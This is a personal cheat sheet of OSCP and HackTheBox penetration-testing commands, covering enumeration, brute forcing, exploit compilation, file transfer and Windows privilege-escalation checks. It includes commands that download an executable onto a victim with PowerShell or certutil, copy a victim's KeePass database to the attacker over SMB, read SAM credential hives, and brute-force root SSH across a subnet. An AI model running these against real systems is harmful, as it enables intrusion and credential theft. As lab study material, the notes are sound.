# oscp-notes

here is a collection of commands i often use for penetration testing. i know there are hundreds of OSCP command guides/references, this is mostly for personal use and therefore the explanations for each command will be as fleshed out as i need them to be. also bear in mind that this is not a complete list.

note: sometimes i will use "ip-addr" to indicate where a target ip should go, sometimes 10.xx.xx.xx, etc
some of these commands i gleaned from working within the HTB labs, not just pwk lab work.

### enumeration

**service and safe scripts scan of an ip/network range**

-oN saves the output in nmap formatting (-oA saves output in xml/nmap/grep format)

`nmap -sC -sV ip-addr -oN '/root/Documents/[ip-addr]/initial.nmap'`

**udp scan**

`nmap -sU ip-addr`

**full port scan**

`nmap -p- ip-addr`

**OS fingerprint** 

`nmap -O ip-addr`

**snmp enumeration**

`nmap -sU -p 161 --script=snmp-brute -Pn 10.xx.x.xxx --script-args snmp-brute.communitiesdb=common-snmp-community-strings.txt`

**snmpwalk**

`snmpwalk 10.xx.x.xxx:161 -v 1 -c public`

**snmpwalk open tcp ports**

`snmpwalk -c public -v1 10.xx.x.xxx 1.3.6.1.2.1.6.13.1.3 `

**snmpwalk windows processes**

`snmpwalk -c public -v1 10.11.1.128 1.3.6.1.2.1.25.4.2.1.2`

**gobuster using default wordlist and scanning for specific statuses**

`gobuster -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.xx.xx.xx:8080/ -s '200,204,301,302,307,403,500' -o gobuster-common.txt`

**gobuster -- fuzzing for file (vs. dir)**

`gobuster -u http://10.xx.xx.xx -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x aspx -o gobuster-default-aspx.txt`

**gobuster ignore ssl cert**

`gobuster -k`

**wordpress?**

`wpscan -u ip-addr`

**nikto**

`nikto -h ip-addr -output output.txt`

**various methods of enumerating smb shares/servers**

`nmap --script smb-* --script-args=unsafe=1`

`nmblookup -A 10.xx.xx.xx`

`enum4linux -A 10.xx.xx.xx`

`nbtscan -r 10.11.1.0/24`

`smbmap -u "" -p "" -d MYGROUP -H 10.11.xx.xx`

note: enum4linux is finnicky on the pwk vm

**smbclient**

-L | list  -I | ip-address  -N | no-pass

`smbclient -L \\SERVER -I xx.xx.xx.xx -N`

`smbclient //SERVER/share -I xx.xx.xx.xx -N`

**auxiliary metasploit scripts**

`msf auxiliary(scanner/smb/smb_version) > use auxiliary/scanner/smb/smb_version`

**enum kerberos users**

`nmap -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='CHANGEME.local',userdb=/usr/share/seclists/Usernames/Names/names.txt -oA '/root/Documents/10.xx.xx.xx_88_kerberos' 10.xx.xx.xx`

**obtain hash from kerberos user**

cd /opt/impacket/examples

`python GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -format hashcat -outputfile hashes.forest`

### bruteforce

**wfuzz bruteforce http login**

observe the POST request in Burp,  plug in the user and password DOM elemenets into the commmand; here the user login is defined by user_login, and the password is defined as pass

we run it first without specifying a character count to ignore, and once we see what the failed login character count is, we ignore that (--hh), so that any different character count that occurs indicates a successful login (or, something that isn't a failed login)

`wfuzz -z file,/usr/share/wordlists/rockyou.txt -d "user_login=admin&pass=FUZZ" --hh 9471 http://10.xx.xx.xx/admin.php`

**wfuzz fuzz**

wfuzz --hc 404 -c -z file,/usr/share/wfuzz/wordlist/general/big.txt http://10.xx.x.xxx/webmail/src/FUZZ.php

**hydra bf ssh**


`hydra -f -V -t 1 -l root -P /usr/share/wordlists/rockyou.txt -s 22 10.11.1.* ssh`

**ncrack bf ssh**

`ncrack -vv -p 22 --user root -P PASS_LIST 10.11.1.*`

### exploitation

**compile for centos on kali**

(unsure if this is applicable just for centos or other distros)

`gcc -Wl,--hash-style=both -m32 -o exploit 9545.c`

**compile windows exe on linux**

`i686-w64-mingw32-gcc 646-fixed.c -lws2_32 -o 646.exe`

**rottenpotato.exe**

run

`whoami /priv`

if SeImpersonatePrivilege is enabled, then the host is likely vulnerable to rotten potato

**msfvenom**

`msfvenom --list | grep windows`

### moving files

**windows file download**

if system is recent enough/powershell is installed:

`powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.xx.xx.xx/afd.exe','c:\wamp\tmp\afd.exe')`

if certutil is available:

`certutil.exe -urlcache -split -f "http://10.xx.xx.xx/afd.exe" c:\wamp\temp\afd.exe`

if neither is an option, echo this script into a new file:

[https://github.com/foxed/oscp-notes/blob/add-notes/scripts/wget.vbs]

**transferring files from windows target to kali**

if smb is enabled on the victim machine, we can use impacket's smbserver.py

On kali:

cd /opt/impacket/examples

``./smbserver Heyo `pwd` ``

here we start up a share called 'Heyo'

you need to use tickmarks with the pwd. note that the names "Heyo" and "Neigh" are completely arbitrary.

on windows (our target/victim):

`New-PSDrive -Name "Neigh" -PSProvider "FileSystem" -Root "\\my.kali.ip\Heyo" `

`cd Neigh`

`PS Neigh:\> cp C:\Users\victim\Documents\CEH.kdbx .`

### windows post exploitation

#### windows enum

**system info**

`set`

`system info`

exact OS version

`type C:/Windows/system32/eula.txt`

**hotfixes installed**

`wmic qfe get Caption,Description,HotFixID,InstalledOn`

**unquoted service paths**

`wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """`

check service binary permissions

`icacls "C:\Program Files (x86)\Program Folder"`

**can we access system files?**

`%SYSTEMROOT%\repair\SAM`

`%SYSTEMROOT%\System32\config\RegBack\SAM`

`%SYSTEMROOT%\System32\config\SAM`

`%SYSTEMROOT%\repair\system`

`%SYSTEMROOT%\System32\config\SYSTEM`

`%SYSTEMROOT%\System32\config\RegBack\system`

**programs, processes, and services**

what software is installed?

`dir /a "C:\Program Files"`

`dir /a "C:\Program Files (x86)"`

`reg query HKEY_LOCAL_MACHINE\SOFTWARE`

file permissions

`icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"`

`icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"`

`icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"`

`icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"`

list windows services, running services/processes

`wmic service list brief`

`tasklist /SVC`

`tasklist /v`

`sc query`

`net start`

list scheduled tasks

`schtasks /query /fo LIST /v`

`schtasks /query /fo LIST 2>nul | findstr TaskName`

`dir C:\windows\tasks`

**AlwaysInstallElevated?**

`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
